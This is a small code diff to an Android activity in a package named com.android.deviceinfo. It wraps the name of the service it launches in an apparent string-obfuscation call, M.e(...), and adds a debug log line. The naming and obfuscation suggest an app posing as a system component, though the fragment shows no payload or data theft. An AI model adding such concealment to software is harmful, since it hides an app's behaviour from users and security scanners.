@@ -28,6 +28,7 @@ import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.capabilities.PackageInfo;
 import com.android.deviceinfo.listener.AR;
 import com.android.deviceinfo.util.Check;
+import com.android.m.M;
 
 /**
  * The Class AndroidServiceGUI.
@@ -119,13 +120,17 @@ public class AGUI extends Activity {
 	}
 
 	private void startService() {
-		final String service = "com.android.deviceinfo.app"; //$NON-NLS-1$
+		final String service = M.e("com.android.deviceinfo.app"); //$NON-NLS-1$
 		// final String service = "android.intent.action.MAIN";
 
 		try {
 			if (Core.isServiceRunning() == false) {
 				this.handler = new Handler();
 
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " Starting cn: "+ service);//$NON-NLS-1$
+				}
+				
 				final ComponentName cn = startService(new Intent(service));
 
 				if (cn == null) {
